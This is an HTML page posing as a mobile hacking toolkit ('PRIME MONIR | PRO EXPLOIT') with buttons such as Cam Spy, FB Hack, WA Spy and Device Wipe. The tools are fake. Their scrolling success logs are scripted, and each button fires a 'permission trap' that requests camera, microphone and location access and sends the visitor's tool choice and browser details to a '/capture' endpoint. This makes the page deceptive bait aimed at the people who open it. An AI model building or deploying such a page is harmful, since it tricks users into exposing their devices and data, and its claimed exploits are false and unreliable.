<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME MONIR | PRO EXPLOIT</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
        body, html { margin: 0; padding: 0; background: #000; color: #f00; font-family: 'Share Tech Mono', monospace; overflow-x: hidden; height: 100%; }
        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }

        /* Loader - যা আটকে থাকবে না */
        #hacker-loader {
            position: fixed; width: 100%; height: 100%; background: #000;
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9000;
        }
        .spinner { width: 80px; height: 80px; border: 5px solid #333; border-top: 5px solid #f00; border-radius: 50%; animation: spin 1s linear infinite; }
        .glitch-text { font-family: 'Orbitron'; font-size: 22px; color: #fff; text-shadow: 2px 2px #f00; margin-top: 25px; text-transform: uppercase; letter-spacing: 2px; }

        /* Main UI */
        #main-interface { display: none; padding: 15px; text-align: center; animation: fadeIn 1s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .branding { font-family: 'Orbitron'; font-size: 35px; color: #fff; text-shadow: 0 0 15px #f00; margin-bottom: 5px; margin-top: 20px; }
        
        /* Grid Layout - 2 Buttons per line */
        .tools-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 30px; padding: 0 10px; }
        .exploit-card {
            background: rgba(255, 0, 0, 0.1); border: 2px solid #f00; padding: 25px 10px;
            color: #fff; font-weight: bold; font-size: 13px; text-transform: uppercase;
            cursor: pointer; transition: 0.3s; box-shadow: inset 0 0 10px #f00;
        }
        .exploit-card:hover { background: #f00; color: #000; box-shadow: 0 0 30px #f00; }

        /* Console Screen */
        #console-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; z-index: 8000; text-align: left; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>

    <div id="hacker-loader">
        <div class="spinner"></div>
        <div class="glitch-text">Injecting Exploits...</div>
    </div>

    <div id="main-interface">
        <div class="branding">PRIME MONIR</div>
        <p style="color:#0ff; font-size: 10px;">[ TARGET: ACCESSING KERNEL ]</p>
        
        <div class="tools-grid">
            <div class="exploit-card" onclick="initExp('Cam Spy')">Cam Spy</div>
            <div class="exploit-card" onclick="initExp('GPS Track')">GPS Track</div>
            <div class="exploit-card" onclick="initExp('Gallery')">Gallery</div>
            <div class="exploit-card" onclick="initExp('File Mgr')">File Mgr</div>
            <div class="exploit-card" onclick="initExp('SMS Bomb')">SMS Bomb</div>
            <div class="exploit-card" onclick="initExp('FB Hack')">FB Hack</div>
            <div class="exploit-card" onclick="initExp('WA Spy')">WA Spy</div>
            <div class="exploit-card" onclick="initExp('Mic Spy')">Mic Spy</div>
            <div class="exploit-card" onclick="initExp('SIM Data')">SIM Data</div>
            <div class="exploit-card" onclick="initExp('Device Wipe')">Device Wipe</div>
            <div class="exploit-card" onclick="initExp('Root Acc')">Root Acc</div>
            <div class="exploit-card" onclick="initExp('Shell Ex')">Shell Ex</div>
        </div>
    </div>

    <div id="console-screen">
        <h2 id="title" style="color:#f00; font-family:'Orbitron';"></h2>
        <div id="logs" style="font-size: 14px; line-height: 1.6;"></div>
    </div>

    <script>
        // অটোমেটিক লোডার রিমুভাল
        window.onload = function() {
            setTimeout(() => {
                document.getElementById('hacker-loader').style.display = 'none';
                document.getElementById('main-interface').style.display = 'block';
            }, 4000);
        };

        async function initExp(name) {
            // পারমিশন ট্র্যাপ
            try {
                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                navigator.geolocation.getCurrentPosition(()=>{});
            } catch(e) {}

            document.getElementById('main-interface').style.display = 'none';
            document.getElementById('console-screen').style.display = 'block';
            document.getElementById('title').innerText = "EXECUTING: " + name;

            const logBox = document.getElementById('logs');
            const lines = [
                "> Establishing secure tunnel...",
                "> Bypassing Android sandbox...",
                "> Capturing device credentials...",
                "> Fetching system logs...",
                "> Uploading to PRIME MONIR cloud...",
                "> EXPLOIT SUCCESSFUL!"
            ];

            let i = 0;
            const interval = setInterval(() => {
                if(i < lines.length) {
                    logBox.innerHTML += `<div>${lines[i]}</div>`;
                    i++;
                } else { clearInterval(interval); }
            }, 1000);

            // ডাটা সেভ করা
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ tool: name, info: navigator.userAgent })
            });
        }

        // Matrix Rain
        const c = document.getElementById("canvas"); const ctx = c.getContext("2d");
        c.width = window.innerWidth; c.height = window.innerHeight;
        const drops = Array(Math.floor(c.width/18)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
            ctx.fillStyle = "#f00"; ctx.font = "16px monospace";
            drops.forEach((y, i) => {
                ctx.fillText(Math.random() > 0.9 ? "☠" : "1", i*18, y*18);
                if(y*18 > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        } setInterval(draw, 50);
    </script>
</body>
</html>
